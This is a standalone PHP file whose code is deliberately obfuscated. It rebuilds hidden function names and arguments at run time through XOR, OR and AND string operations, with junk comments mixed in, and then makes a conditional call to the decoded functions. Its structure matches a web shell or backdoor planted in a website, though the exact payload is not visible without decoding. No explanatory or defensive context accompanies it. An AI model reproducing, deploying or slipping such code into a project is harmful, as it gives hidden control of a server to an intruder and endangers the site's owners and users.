<?php
$jar9qO3vP='dlD3uN0_yyn'^~y4SQ0iX7S;$YQ_uQv2=q76x.'@WP^!rO'^'9vBY$$8*DZ#';$OnM2uCP6d='2 1'.
           '4 Q )B%(P'|'9 !4(R *@*(C';$ylxs48E9EJs='e~<ua?'&'||'.yf7x;$q9kKd='Na&jNY'^'bI'.
           'J^0 ';$hWRQY='_v]{'._Z_L.'?'.o_vmS.'|{'._wwuz__W&#RC7qhheuzncFNppvbQl0Hz_eWOP'.
           'm}V{_|__?w_{Ksv{_}wu{_]g';$VZnm="n}~U_^"._zwW_."~".Wr____."[EW_{t"&'j]~'./*n3'.
           'o({RcgMwI*/t_Z_nsw_QG.'~_}_]{'.eW_o.']';$RliZI_rtg=B^p;$Kz='}'.__Z4.'>uI'&'}{'.
           'WU<v=|';$gxAMq2='s]}}'&'s_}z';$vtToLq=qW9zf_.'}'&'kG?~uA?';$GeOl8cTQl='?'&#r8'.
           '}';$HEJxR='@'.JIBH.'@'|LCXIDI;$Z9XqggUaZR0='@5LH'|'B%IH';$rGGqteaN='A@'|e8;/*'.
           '#=s,_*/$BY=k&m;$r4A=F^'2';$ZnfeVTB=a|'`';$V0X=e|A;$VeA6A40DsWP=wO9mn.'{{7}]Jk'.
           '[_[u'&'eC7}'.c3Js.'[x{{'.zWuv;$DtAJ99BL=('f%d=]@?-qDw'^BABXs3WI4.'%5')|/*hgvV'.
           'U$~aA$g~Sg*/$YQ_uQv2;$dSFrtTsbQ=('@M['^'=9,')&(']GD'^'0+y');$qVwD2JmFV=/*jYhZ'.
           'CPw)YgI,jm*/$HEJxR^('o~/?g?'&'+.=."?');$OJJIQ4GBcJ=('KR@Cu ES&NH6'|'@'./*rMN0'.
           '+wr,*/PTRV.'!AX.HK"')^$OnM2uCP6d;$n6u50hKhw=$ylxs48E9EJs^$q9kKd;'Yi2sKtbrJlve'.
           'r,e^Z^;(KY';$ZwSuhCaTmPh=("hDB%"|'%Tb-')^$Z9XqggUaZR0;$ec3=$hWRQY&$VZnm;if(/*'.
           '2*/$DtAJ99BL($dSFrtTsbQ($qVwD2JmFV($n6u50hKhw)),('}g9=ws5{c;;7y9g='&'5'./*gsq'.
           'C?V~^ ;: c*/l55dn53y.'='.u796e.';').("Ei,&".cQReOd."}"^tZHEW4bP.".UN").(#YKE1'.
           '18!0'|' !b4').$RliZI_rtg))$OJJIQ4GBcJ($ZwSuhCaTmPh,$rGGqteaN.$BY.$r4A,/*w0L3m'.
           'H0[ */$ZnfeVTB);$OJJIQ4GBcJ($Kz.$gxAMq2.$V0X.$BY,$qVwD2JmFV($ec3),/*OzIe_C9q6'.
           'G!Lx2KUt<*/$VeA6A40DsWP.$vtToLq.$GeOl8cTQl);#$Rr?FJI)g1rV^dJb^|M49qfSTqbHukz'.
           'd{Xgawv._4@ZK|}uc=D>G#-t*g$hS&LAVsDHv1@y5xC';